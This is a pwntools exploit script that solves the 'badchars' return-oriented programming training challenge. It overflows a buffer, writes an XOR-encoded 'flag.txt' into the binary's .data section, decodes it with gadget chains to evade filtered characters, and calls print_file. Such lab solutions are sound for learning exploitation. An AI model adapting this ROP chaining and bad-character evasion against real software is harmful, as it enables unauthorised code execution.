#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# pyright: reportUndefinedVariable=false
from pwn import *

exe = context.binary = ELF("badchars")


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
b *0x40062b
continue
""".format(
    **locals()
)

mov_r13_r12 = 0x0000000000400634
xor_r15_r14 = 0x0000000000400628
pop_rdi = 0x00000000004006A3
pop_r14_r15 = 0x00000000004006A0
pop_r12_r13_r14_r15 = 0x000000000040069C
_data = 0x0000000000601028
_bss = 0x0000000000601038
ret = 0x00000000004004EE

xor_value = 0x3
# eobd-w{w
xor_string = xor(b"flag.txt", xor_value)

print("xor_string", xor_string)
# stage-1 (writing to .data)
pay = b"\x90" * 40
pay += p64(ret)
pay += p64(pop_r12_r13_r14_r15)
pay += xor_string
pay += p64(_data)
pay += p64(0x0)
pay += p64(0x0)
pay += p64(mov_r13_r12)

# stage-2 (xor)
for _ in range(8):
    pay += p64(pop_r12_r13_r14_r15)
    pay += p64(0x0)
    pay += p64(0x0)
    pay += p64(xor_value)
    pay += p64(_data + _)
    pay += p64(xor_r15_r14)

# stage-3 (calling print_file)
pay += p64(pop_rdi)
pay += p64(_data)
pay += p64(exe.sym.print_file)


io = start()
io.sendlineafter(b"> ", pay)
io.interactive()
